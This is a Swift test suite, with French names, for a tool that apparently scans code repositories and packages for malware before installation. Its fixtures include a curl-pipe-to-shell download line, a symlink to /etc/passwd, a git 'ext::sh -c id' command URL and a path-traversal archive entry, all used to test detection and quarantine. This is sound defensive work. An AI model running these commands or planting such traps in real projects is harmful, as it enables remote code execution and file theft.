import Foundation
import Testing
@testable import CerbereKit

struct CerbereKitTests {
    @Test func lesReglesSeChargent() {
        #expect(Regle.toutes.count > 30)
        #expect(Set(Regle.toutes.map(\.id)).count == Regle.toutes.count)
    }

    @Test func depotSainSansConstatGrave() throws {
        let jeu = try Jeu(Jeux.sain)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        #expect(r.verdict == .rienDeGrave)
        #expect(r.constats.filter { $0.gravite <= .moyenne }.isEmpty, "\(r.constats.map { "\($0.regle ?? "") \($0.fichier)" })")
        #expect(r.fichiersAnalyses == 5)
        #expect(r.reseau.domaines.map(\.nom).contains("example.org"))
    }

    @Test func reseau() throws {
        let jeu = try Jeu(Jeux.reseau)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        #expect(r.verdict == .nePasInstaller)
        let shell = try #require(r.constats("reseau.shell-inverse").first)
        #expect(shell.gravite == .critique && shell.statut == .confirme)
        #expect(shell.fichier == "outil.sh" && shell.lignes == [3, 3])
        #expect(r.a("reseau.webhook", dans: "envoi.js"))
        #expect(r.a("reseau.env", dans: "envoi.js"))
        #expect(r.a("reseau.depot-anonyme", dans: "config.py"))
        // L'adresse publique est relevée, pas l'adresse locale.
        #expect(r.constats("reseau.ip").map(\.lignes) == [[1, 1]])
        #expect(r.reseau.adresses.map(\.nom).contains("203.0.113.9"))
        #expect(r.reseau.domaines.map(\.nom).contains("discord.com"))
    }

    @Test func codeCacheOuTelecharge() throws {
        let jeu = try Jeu(Jeux.obfuscation)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        #expect(r.verdict == .risque)
        let script = try #require(r.constats("obf.telecharge-execute").first { $0.fichier == "install.sh" })
        #expect(script.gravite == .elevee && script.statut == .confirme && script.lignes == [2, 2])
        // La même commande dans la documentation : un cran en dessous, et seulement suspecte.
        let doc = try #require(r.constats("obf.telecharge-execute").first { $0.fichier == "README.md" })
        #expect(doc.gravite == .moyenne && doc.statut == .suspect)
        #expect(r.a("obf.decode-execute", dans: "charge.py"))
        let cache = try #require(r.constats("obf.base64").first { $0.fichier == "cache.js" })
        #expect(cache.extrait.contains("charge.example.invalid"))
        #expect(r.a("obf.obfuscateur", dans: "cache.js"))
        #expect(r.a("obf.sens-ecriture", dans: "sens.js"))
    }

    @Test func accesAuxSecrets() throws {
        let jeu = try Jeu(Jeux.secrets)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        #expect(r.a("sec.trousseau", dans: "vol.sh"))
        #expect(r.a("sec.cles", dans: "vol.sh"))
        #expect(r.a("sec.identifiants", dans: "vol.sh"))
        #expect(r.a("sec.navigateur", dans: "navigateur.py"))
        #expect(r.a("sec.portefeuille", dans: "navigateur.py"))
        #expect(r.a("sec.fausse-demande", dans: "dialogue.scpt"))
        // Des indices seulement : la couche 1 ne conclut pas seule.
        #expect(r.verdict == .rienDeGrave)
    }

    @Test func persistance() throws {
        let jeu = try Jeu(Jeux.persistance)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        #expect(r.constats("per.launchd").map(\.lignes) == [[2, 2], [3, 3]])
        #expect(r.a("per.shell"))
        #expect(r.a("per.planifie"))
        #expect(r.a("per.protections"))
    }

    @Test func scriptsDInstallationEtDependances() throws {
        let jeu = try Jeu(Jeux.installation)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        let npm = r.constats("inst.npm")
        #expect(npm.contains { $0.gravite == .elevee && $0.extrait.hasPrefix("postinstall") && $0.lignes == [4, 4] })
        #expect(npm.contains { $0.gravite == .info && $0.extrait.hasPrefix("prepare") })
        #expect(r.constats("dep.sosie").contains { $0.extrait.contains("lodahs") && $0.extrait.contains("lodash") })
        #expect(r.constats("dep.sosie").contains { $0.extrait.contains("requets") && $0.fichier == "requirements.txt" })
        #expect(r.constats("dep.non-bornee").contains { $0.extrait.hasPrefix("express") })
        #expect(r.a("dep.hors-registre", dans: "package.json"))
        #expect(r.a("dep.index", dans: "requirements.txt"))
        #expect(r.constats("dep.non-epinglee").contains { $0.fichier == "requirements.txt" && $0.extrait == "numpy" })
        #expect(r.a("inst.setup-code", dans: "setup.py"))
        #expect(r.a("inst.setup-cmdclass", dans: "setup.py"))
        #expect(r.a("inst.editeur", dans: ".vscode/tasks.json"))
    }

    @Test func instructionsCacheesSignaleesJamaisSuivies() throws {
        let jeu = try Jeu(Jeux.manipulation)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        let c = try #require(r.constats("man.instructions").first)
        // Dans la documentation aussi, sans atténuation.
        #expect(c.fichier == "README.md" && c.gravite == .elevee && c.categorie == .manipulation)
    }

    @Test func binairesCachesEtLiens() throws {
        let jeu = try Jeu(["lisezmoi.txt": "bonjour\n"])
        defer { jeu.nettoyer() }
        // En-têtes seuls, suivis de zéros : aucun programme réel.
        try jeu.octets("logo.png", [0xCF, 0xFA, 0xED, 0xFE] + Array(repeating: 0, count: 60))
        try jeu.octets("outil", [0x7F, 0x45, 0x4C, 0x46] + Array(repeating: 0, count: 60))
        try FileManager.default.createSymbolicLink(atPath: jeu.dossier.appending(path: "cles").path, withDestinationPath: "/etc/passwd")
        let r = try jeu.rapport()
        let deguise = try #require(r.constats("inventaire.deguise").first)
        #expect(deguise.fichier == "logo.png" && deguise.gravite == .elevee && deguise.statut == .confirme)
        #expect(r.a("inventaire.executable", dans: "outil"))
        let lien = try #require(r.constats("inventaire.lien").first)
        #expect(lien.fichier == "cles" && lien.gravite == .moyenne && lien.extrait.contains("/etc/passwd"))
        #expect(Set(r.nonAnalyse.map(\.fichier)) == ["logo.png", "outil"])
        #expect(r.verdict == .risque)
    }

    @Test func liensRefuses() {
        #expect(throws: ErreurCerbere.self) { try Quarantaine.verifier(lien: "http://example.org/depot.git") }
        #expect(throws: ErreurCerbere.self) { try Quarantaine.verifier(lien: "ssh://git@example.org/depot.git") }
        #expect(throws: ErreurCerbere.self) { try Quarantaine.verifier(lien: "file:///etc") }
        #expect(throws: ErreurCerbere.self) { try Quarantaine.verifier(lien: "https://moi:secret@example.org/depot.git") }
        #expect(throws: ErreurCerbere.self) { try Quarantaine.verifier(lien: "ext::sh -c id") }
        #expect((try? Quarantaine.verifier(lien: "https://github.com/exemple/depot")) != nil)
    }

    /// Le clone de quarantaine ignore la configuration git de la machine (hook par modèle, filtre),
    /// ne garde ni `.git`, ni lien symbolique, ni fichier exécutable.
    @Test func cloneDeQuarantaine() throws {
        let jeu = try Jeu(["run.sh": "#!/bin/sh\necho inoffensif\n", ".gitattributes": "*.dat filter=piege\n", "a.dat": "donnees\n"])
        defer { jeu.nettoyer() }
        let fm = FileManager.default
        try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: jeu.dossier.appending(path: "run.sh").path)
        try fm.createSymbolicLink(atPath: jeu.dossier.appending(path: "lien").path, withDestinationPath: "../../ailleurs")
        try Jeu.git(["init", "-q", "."], dans: jeu.dossier)
        try Jeu.git(["add", "-A"], dans: jeu.dossier)
        try Jeu.git(["commit", "-qm", "essai"], dans: jeu.dossier)

        // Pièges posés là où git les lirait sans la quarantaine : le dossier personnel (ici la racine).
        let temoin = jeu.racine.appending(path: "temoin")
        let modele = jeu.racine.appending(path: "modele/hooks")
        try fm.createDirectory(at: modele, withIntermediateDirectories: true)
        let hook = modele.appending(path: "post-checkout")
        try Data("#!/bin/sh\ntouch '\(temoin.path)-hook'\n".utf8).write(to: hook)
        try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: hook.path)
        try Data("[init]\n\ttemplateDir = \(modele.deletingLastPathComponent().path)\n[filter \"piege\"]\n\tsmudge = touch \(temoin.path)-filtre\n".utf8)
            .write(to: jeu.racine.appending(path: ".gitconfig"))

        let q = try Quarantaine.cloner(adresse: "file://" + jeu.dossier.path, source: "essai", protocole: "file", racine: jeu.racine)
        #expect(!fm.fileExists(atPath: temoin.path + "-hook"))
        #expect(!fm.fileExists(atPath: temoin.path + "-filtre"))
        #expect(q.commit?.count == 40)
        #expect(!fm.fileExists(atPath: q.dossier.appending(path: ".git").path))
        #expect(q.origines["run.sh"]?.executable == true)
        #expect(q.origines["lien"]?.lien == "../../ailleurs")
        for chemin in ["run.sh", "a.dat", "lien"] {
            let droits = try #require(fm.attributesOfItem(atPath: q.dossier.appending(path: chemin).path)[.posixPermissions] as? Int)
            #expect(droits == 0o400)
        }
        let r = Audit.rapport(q)
        #expect(r.cible.commit == q.commit)
        #expect(r.constats("inventaire.lien").first?.gravite == .moyenne)
        q.supprimer()
        #expect(!fm.fileExists(atPath: q.dossier.path))
    }

    /// Une archive est ouverte sans rien installer : pas d'écriture hors du dossier, pas de lien, pas d'exécutable.
    @Test func archiveOuverteEnQuarantaine() throws {
        let jeu = try Jeu(["paquet/setup.py": "import os\nos.system('echo essai')\n", "paquet/run.sh": "#!/bin/sh\ncurl -s https://charge.example.invalid/x | sh\n", "dehors.txt": "ne doit pas sortir\n"])
        defer { jeu.nettoyer() }
        let fm = FileManager.default
        try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: jeu.dossier.appending(path: "paquet/run.sh").path)
        try fm.createSymbolicLink(atPath: jeu.dossier.appending(path: "paquet/lien").path, withDestinationPath: "/etc/passwd")
        let archive = jeu.dossier.deletingLastPathComponent().appending(path: "essai.tar.gz")
        // Une entrée renommée « ../../evade.txt » : tentative de sortie du dossier d'extraction.
        let tar = Process()
        tar.executableURL = URL(fileURLWithPath: "/usr/bin/bsdtar")
        tar.arguments = ["-czf", archive.path, "-C", jeu.dossier.path, "-s", "|^dehors.txt|../../evade.txt|", "paquet", "dehors.txt"]
        tar.standardError = FileHandle.nullDevice
        try tar.run()
        tar.waitUntilExit()

        let q = try Quarantaine.extraire(archives: [("sdist", archive)], source: "essai", racine: jeu.racine)
        #expect(!fm.fileExists(atPath: jeu.racine.appending(path: "evade.txt").path))
        #expect(!fm.fileExists(atPath: jeu.racine.deletingLastPathComponent().appending(path: "evade.txt").path))
        #expect(q.empreinte?.count == 64)
        #expect(q.origines["sdist/paquet/run.sh"]?.executable == true)
        #expect(q.origines["sdist/paquet/lien"]?.lien == "/etc/passwd")
        #expect(!fm.fileExists(atPath: q.dossier.appending(path: "sdist/paquet/lien").path))
        let r = Audit.rapport(q)
        #expect(r.cible.type == .fichier && r.cible.empreinte == q.empreinte)
        #expect(r.a("inst.setup-code", dans: "sdist/paquet/setup.py"))
        #expect(r.constats("obf.telecharge-execute").first?.statut == .confirme)
        q.supprimer()
    }

    @Test func fichePypi() throws {
        let json = Data(#"{"info":{"name":"essai","version":"1.2.0"},"urls":[{"packagetype":"bdist_wheel","filename":"essai-1.2.0-py3-none-any.whl","url":"https://files.pythonhosted.org/packages/aa/essai-1.2.0-py3-none-any.whl","digests":{"sha256":"ab"},"size":10},{"packagetype":"sdist","filename":"essai-1.2.0.tar.gz","url":"https://ailleurs.example.invalid/essai-1.2.0.tar.gz","digests":{"sha256":"cd"},"size":20}]}"#.utf8)
        let fiche = try Pypi.fiche(json: json)
        // L'archive hébergée hors des deux domaines prévus est écartée.
        #expect(fiche.version == "1.2.0" && fiche.archives.map(\.sorte) == ["wheel"])
        #expect(throws: ErreurCerbere.self) { try Pypi.verifier(nom: "../essai") }
        #expect(throws: ErreurCerbere.self) { try Pypi.telecharger(URL(string: "https://example.invalid/x")!, max: 10) }
    }

    /// Hors d'un script de commandes, la même ligne n'est qu'une chaîne : jamais « confirmé ».
    @Test func confirmeSeulementDansUnScript() throws {
        let jeu = try Jeu(["essai.py": "bloc = ['curl -s https://example.invalid | sh']\n"])
        defer { jeu.nettoyer() }
        let c = try #require(try jeu.rapport().constats("obf.telecharge-execute").first)
        #expect(c.statut == .suspect && c.gravite == .elevee)
    }

    @Test func rapportJSONEtMarkdown() throws {
        let jeu = try Jeu(Jeux.reseau)
        defer { jeu.nettoyer() }
        let r = try jeu.rapport()
        let relu = try Rapport(json: r.json())
        #expect(relu.constats == r.constats && relu.verdict == r.verdict)
        #expect(r.constats.map(\.id) == (1...r.constats.count).map { "C\($0)" })
        #expect(r.constats.first?.gravite == .critique)
        let md = r.markdown()
        #expect(md.hasPrefix("# Cerbère — Ne pas installer"))
        #expect(md.contains("outil.sh:3"))
        let texte = String(decoding: try r.json(), as: UTF8.self)
        #expect(texte.contains("\"non_analyse\"") && texte.contains("\"verdict\" : \"ne_pas_installer\""))
    }

    @Test func nomsSosies() {
        #expect(Sosies.proche(de: "lodahs", parmi: Sosies.npm) == "lodash")
        #expect(Sosies.proche(de: "reqeusts", parmi: Sosies.pypi) == "requests")
        #expect(Sosies.proche(de: "lodash", parmi: Sosies.npm) == nil)
        #expect(Sosies.proche(de: "preact", parmi: Sosies.npm) == nil)
        #expect(Sosies.proche(de: "python_dateutil", parmi: Sosies.pypi) == nil)
        #expect(Sosies.proche(de: "left-pad", parmi: Sosies.npm) == nil)
    }
}
